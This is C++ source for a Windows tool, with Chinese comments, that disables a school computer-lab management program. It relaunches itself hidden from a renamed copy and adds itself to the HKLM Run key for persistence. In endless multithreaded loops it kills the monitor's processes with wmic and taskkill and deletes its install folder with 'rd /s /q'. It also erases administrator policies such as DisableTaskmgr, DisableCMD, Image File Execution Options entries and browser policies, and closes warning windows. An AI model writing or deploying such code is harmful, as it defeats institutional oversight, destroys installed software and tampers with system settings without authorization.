#include<windows.h>
#include<iostream>
#include<io.h>
#include<fcntl.h>
#include<CommCtrl.h>
#include<string>
#include<sstream>

#pragma comment(lib, "comctl32.lib")

wchar_t wcBootupTimeToNow[MAX_PATH];
char cmdAttribZM[MAX_PATH] = "attrib.exe -S -H ";
char cmdRemoveZM[MAX_PATH] = "cmd /c rd /s /q ";

STARTUPINFO si;
STARTUPINFOA siA;
PROCESS_INFORMATION pi;

//设为UTF-16控制台输入输出
VOID initCons()
{
	_setmode(_fileno(stdout), _O_U16TEXT);
	_setmode(_fileno(stdin), _O_U16TEXT);
	_setmode(_fileno(stderr), _O_U16TEXT);
}

//获取距离启动电脑的时间，并转为宽字符流，再转为宽字符串，再转为C风格
VOID getBootupTimeToNow()
{
	ULONGLONG ulBootupTimeToNow = GetTickCount64();
	std::wstringstream wssBootupTimeToNow;
	wssBootupTimeToNow << ulBootupTimeToNow;
	std::wstring wsBootupTimeToNow = wssBootupTimeToNow.str();
	wcscpy(wcBootupTimeToNow, wsBootupTimeToNow.c_str());
}

//检查路径合法性
VOID chkPath()
{
	//获得路径
	wchar_t pathNow[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), pathNow, MAX_PATH);

	//不合法的路径表
	const wchar_t pathPolicies[10][MAX_PATH] = {
		L"stu",
		L"Stu",
		L"STU",

		L"teach",
		L"Teach",
		L"TEACH",

		L"学",
		L"校",
		L"机房",
		L"教",
	};

	wchar_t newFileName[MAX_PATH] = L"C:\\";
	
	//主检查
	for (ULONGLONG i = 0; i < 10; i++)
	{
		if (wcsstr(pathNow, pathPolicies[i]) != NULL)
		{
			//制作文件名
			getBootupTimeToNow();
			wcscat(newFileName, wcBootupTimeToNow);
			wcscat(newFileName, L".exe");
			CopyFile(pathNow, newFileName, FALSE);
			Sleep(300);

			//启动新文件
			ZeroMemory(&si, sizeof(si));
			ZeroMemory(&pi, sizeof(pi));
			CreateProcess(newFileName, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			
			ExitProcess(0x0E);//Error
		}
	}
}


//询问是否运行
INT askIfRun()
{
	//初始化对话框
	TASKDIALOGCONFIG msgBox;
	ZeroMemory(&msgBox, sizeof(msgBox));
	INT buttonClicked = 0;

	msgBox.cbSize = sizeof(msgBox);
	msgBox.dwCommonButtons = TDCBF_OK_BUTTON | TDCBF_CANCEL_BUTTON;
	getBootupTimeToNow();
	msgBox.pszWindowTitle = wcBootupTimeToNow;
	msgBox.pszMainInstruction = L"v4.0新版本";
	msgBox.pszContent = L"For 12.1";
	msgBox.pszFooter = L"For 12.1";
	msgBox.pszMainIcon = TD_INFORMATION_ICON;
	msgBox.pszFooterIcon = TD_INFORMATION_ICON;
	msgBox.dwFlags = TDF_SIZE_TO_CONTENT;

	TaskDialogIndirect(&msgBox, &buttonClicked, NULL, NULL);

	return buttonClicked;
}

//1.加入自启动
VOID WINAPI addToAutorun()
{
	while (1)
	{
		HKEY hkey;
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &hkey, NULL);

		//制作随机名称
		getBootupTimeToNow();

		//获得路径
		wchar_t pathNow[MAX_PATH];
		GetModuleFileName(GetModuleHandle(NULL), pathNow, MAX_PATH);

		RegSetValueEx(hkey, L"DisableCMD", NULL, REG_SZ, (const BYTE*)pathNow, (wcslen(pathNow) + 1) * sizeof(wchar_t));
		RegCloseKey(hkey);
	}
}

//2.恢复注册表关键项
VOID WINAPI recoveryRegistryKeys()
{
	while (1)
	{
		//1.删除助手自启动
		HKEY hkey;
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteValue(hkey, L"jfglzsn");
		RegDeleteValue(hkey, L"prozs");
		RegCloseKey(hkey);

		//2.解除映像劫持
		wchar_t ifeoList[53][MAX_PATH] = {
			L"bckgzm.exe",
			L"Chess.exe",
			L"chkrzm.exe",
			L"EOSnotify.exe",
			L"ExtExport.exe",
			L"FreeCell.exe",
			L"Hearts.exe",
			L"ie4uinit.exe",
			L"ieinstal.exe",
			L"ielowutil.exe",
			L"ieUnatt.exe",
			L"iexplore.exe",
			L"InstallAgent.exe"
			L"Magnify.exe",
			L"Mahjong.exe",
			L"MicrosoftEdgeUpdate.exe",
			L"Minesweeper.exe",
			L"MoNotificationUx.exe",
			L"mpcmdrun.exe",
			L"MRT.exe",
			L"mscorsvw.exe",
			L"msfeedssync.exe",
			L"mshta.exe",
			L"MsMpEng.exe",
			L"MsSense.exe",
			L"MusNotification.exe",
			L"MusNotificationUx.exe",
			L"ngen.exe",
			L"ngentask.exe",
			L"PresentationHost.exe",
			L"PrintDialog.exe",
			L"PrintIsolationHost.exe",
			L"PurblePlace.exe",
			L"remsh.exe",
			L"runtimebroker.exe",
			L"sethc.exe",
			L"shvlzm.exe",
			L"sidebar.exe",
			L"SihClient.exe",
			L"Solitaire.exe",
			L"SpiderSolitaire.exe",
			L"splwow64.exe"
			L"spoolsv.exe",
			L"svchost.exe",
			L"SystemSettings.exe",
			L"tasklist.exe",
			L"UpdateAssistant.exe",
			L"UsoClient.exe",
			L"WaaSMedic.exe",
			L"WaasMedicAgent.exe",
			L"Windows10Upgrade.exe",
			L"Windows10UpgraderApp.exe",
			L"winmine.exe"
			L"taskkill.exe",
			L"wmic.exe",
			L"powershell.exe"
		};
		
		for (ULONGLONG i = 0; i < 53; i++)
		{
			wchar_t regPath[MAX_PATH] = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
			wcscat(regPath, ifeoList[i]);
			RegOpenKeyEx(HKEY_LOCAL_MACHINE, regPath, NULL, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
			RegDeleteTree(hkey, NULL);
			RegCloseKey(hkey);
		}

		//3.解禁cmd
		RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", NULL, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteValue(hkey, L"DisableCMD");
		RegCloseKey(hkey);

		//4.删除ZM在注册表中的配置
		RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\jfglzs", NULL, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteTree(hkey, NULL);
		RegCloseKey(hkey);

		//5.解禁实用组件
		RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteValue(hkey, L"DisableTaskmgr");
		RegDeleteValue(hkey, L"DisableSwitchUserOption");
		RegDeleteValue(hkey, L"DisableRegistryTools");
		RegDeleteValue(hkey, L"DisableLockWorkstation");
		RegDeleteValue(hkey, L"DisableChangePassword");
		RegCloseKey(hkey);

		RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteValue(hkey, L"NoLogOff");
		RegDeleteValue(hkey, L"NoRun");
		RegDeleteValue(hkey, L"NoTrayContextMenu");
		RegDeleteValue(hkey, L"NoFolderOptions");
		RegDeleteValue(hkey, L"StartMenuLogOff");
		RegCloseKey(hkey);

		//6.解禁Win键
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteValue(hkey, L"Scancode Map");
		RegCloseKey(hkey);

		//7.解禁浏览器相关项
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Google\\Chrome", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteTree(hkey, NULL);
		RegCloseKey(hkey);

		RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Edge", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteTree(hkey, NULL);
		RegCloseKey(hkey);

		RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Mozilla\\Firefox", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteTree(hkey, NULL);
		RegCloseKey(hkey);

		RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Internet Explorer\\Restrictions", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
		RegDeleteValue(hkey, L"NoBrowserSaveAs");
		RegCloseKey(hkey);
		
	}
}

//3.获取助手安装路径，并加入删除命令中
VOID getZMPath()
{
	DWORD dataType;
	DWORD dataSize = 0;

	HKEY hkey;
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\ZM软件工作室\\学生机房管理助手", NULL, KEY_ALL_ACCESS | KEY_WOW64_32KEY, &hkey);
	RegQueryValueExA(hkey, "Path", NULL, &dataType, NULL, &dataSize);
	BYTE* data = new BYTE[dataSize];
	RegQueryValueExA(hkey, "Path", NULL, &dataType, data, &dataSize);

	std::stringstream ssRegData;
	ssRegData << data;
	delete[] data;

	std::string sRegData = ssRegData.str();
	strcat(cmdRemoveZM, sRegData.c_str());
	strcat(cmdAttribZM, sRegData.c_str());
	strcat(cmdAttribZM, "*.*");//表示所有文件
}

//4.结束ZM进程
VOID WINAPI killZMProcess()
{
	wchar_t zmNames[48][MAX_PATH] = {
		
		//L"wmic process where name=\"zmserv.exe\" delete",
		L"wmic process where name=\"zmsrv.exe\" delete",
		L"wmic process where name=\"jfglzs.exe\" delete",
		L"wmic process where name=\"jfglzsn.exe\" delete",
		L"wmic process where name=\"password.exe\" delete",
		L"wmic process where name=\"srvany.exe\" delete",
		L"wmic process where name=\"prozs.exe\" delete",
		L"wmic process where name=\"przs.exe\" delete",

		L"wmic process where name=\"abcut.exe\" delete",
		L"wmic process where name=\"about.exe\" delete",
		L"wmic process where name=\"instsrv.exe\" delete",
		L"wmic process where name=\"regini.exe\" delete",
		L"wmic process where name=\"sct.exe\" delete",
		L"wmic process where name=\"set.exe\" delete",
		L"wmic process where name=\"uninstal1.exe\" delete",
		L"wmic process where name=\"uninstall.exe\" delete",
		L"wmic process where name=\"yz.exe\" delete",


		//L"wmic process where name=\"zmserv.exe\" call terminate",
		L"wmic process where name=\"zmsrv.exe\" call terminate",
		L"wmic process where name=\"jfglzs.exe\" call terminate",
		L"wmic process where name=\"jfglzsn.exe\" call terminate",
		L"wmic process where name=\"password.exe\" call terminate",
		L"wmic process where name=\"srvany.exe\" call terminate",
		L"wmic process where name=\"prozs.exe\" call terminate",
		L"wmic process where name=\"przs.exe\" call terminate",

		L"wmic process where name=\"abcut.exe\" call terminate",
		L"wmic process where name=\"about.exe\" call terminate",
		L"wmic process where name=\"instsrv.exe\" call terminate",
		L"wmic process where name=\"regini.exe\" call terminate",
		L"wmic process where name=\"sct.exe\" call terminate",
		L"wmic process where name=\"set.exe\" call terminate",
		L"wmic process where name=\"uninstal1.exe\" call terminate",
		L"wmic process where name=\"uninstall.exe\" call terminate",
		L"wmic process where name=\"yz.exe\" call terminate",
		
		
		//L"taskkill /im zmserv.exe /f /t",
		L"taskkill /im zmsrv.exe /f /t",
		L"taskkill /im jfglzs.exe /f /t",
		L"taskkill /im jfglzsn.exe /f /t",
		L"taskkill /im password.exe /f /t",
		L"taskkill /im srvany.exe /f /t",
		L"taskkill /im prozs.exe /f /t",
		L"taskkill /im przs.exe /f /t",
		
		L"taskkill /im abcut.exe /f /t",
		L"taskkill /im about.exe /f /t",
		L"taskkill /im instsrv.exe /f /t",
		L"taskkill /im regini.exe /f /t",
		L"taskkill /im sct.exe /f /t",
		L"taskkill /im set.exe /f /t",
		L"taskkill /im uninstal1.exe /f /t",
		L"taskkill /im uninstall.exe /f /t",
		L"taskkill /im yz.exe /f /t"
	};

	while (1)
	{
		for (ULONGLONG i = 0; i < 48; i++)
		{
			ZeroMemory(&si, sizeof(si));
			ZeroMemory(&pi, sizeof(pi));
			CreateProcess(NULL, zmNames[i], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

			WaitForSingleObject(pi.hProcess, INFINITE);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
		}
	}
}

//5.更改隐藏属性，删除ZM文件夹
VOID WINAPI deleteZM()
{
	while (1)
	{
		_setmode(_fileno(stdout), _O_TEXT);
		//(1)更改隐藏属性
		ZeroMemory(&siA, sizeof(siA));
		ZeroMemory(&pi, sizeof(pi));

		CreateProcessA(NULL, cmdAttribZM, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &siA, &pi);

		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		
		//(2)删除ZM文件夹
		//std::cout << cmdAttribZM << "\n";
		//std::cout << cmdRemoveZM << "\n";
		
		STARTUPINFOA siA;

		ZeroMemory(&siA, sizeof(siA));
		ZeroMemory(&pi, sizeof(pi));

		CreateProcessA(NULL, cmdRemoveZM, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &siA, &pi);

		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		_setmode(_fileno(stdout), _O_U16TEXT);
	}
}

//6.结束随机名称的ZM进程
VOID WINAPI killWarnings()
{
	HWND randomProcessWindow;
	DWORD pid;
	HANDLE hProcess;
	while (1)
	{
		randomProcessWindow = FindWindow(NULL, L"提醒");
		GetWindowThreadProcessId(randomProcessWindow, &pid);
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		TerminateProcess(hProcess, 0xFFFFFFFF);
		CloseHandle(hProcess);

		randomProcessWindow = FindWindow(NULL, L"警告");
		GetWindowThreadProcessId(randomProcessWindow, &pid);
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		TerminateProcess(hProcess, 0xFFFFFFFF);
		CloseHandle(hProcess);
	}
}

VOID run()
{
	//1.加入自启动
	for (ULONGLONG i = 0; i < 2; i++)
	{
		HANDLE hThread;
		hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)addToAutorun, NULL, NULL, NULL);
		if (hThread)
		{
			CloseHandle(hThread);
		}
	}

	//2.恢复注册表关键项
	for (ULONGLONG i = 0; i < 3; i++)
	{
		HANDLE hThread;
		hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)recoveryRegistryKeys, NULL, NULL, NULL);
		if (hThread)
		{
			CloseHandle(hThread);
		}
	}
	
	//3.结束ZM进程
	//创建多个线程以提高结束进程的成功率
	for (ULONGLONG i = 0; i < 6; i++)
	{
		HANDLE hThread;
		hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)killZMProcess, NULL, NULL, NULL);
		if (hThread)
		{
			CloseHandle(hThread);
		}
	}

	//4.获取助手安装路径，并加入删除命令中
	getZMPath();

	//5.删除ZM助手
	for (ULONGLONG i = 0; i < 3; i++)
	{
		HANDLE hThread;
		hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)deleteZM, NULL, NULL, NULL);
		if (hThread)
		{
			CloseHandle(hThread);
		}
	}

	//6.结束随机名称的ZM进程
	HANDLE hThread;
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)killWarnings, NULL, NULL, NULL);
	if (hThread)
	{
		CloseHandle(hThread);
	}
}

int wmain()
{
	initCons();

	chkPath();

	//判断用户选择
	if (askIfRun() == IDOK)
	{
		//用户选择是，继续运行
		while (1)
		{
			run();
			Sleep(10000);
		}
	}
	else
	{
		//用户选择否，退出程序
		ExitProcess(0x0C);//Close
	}
}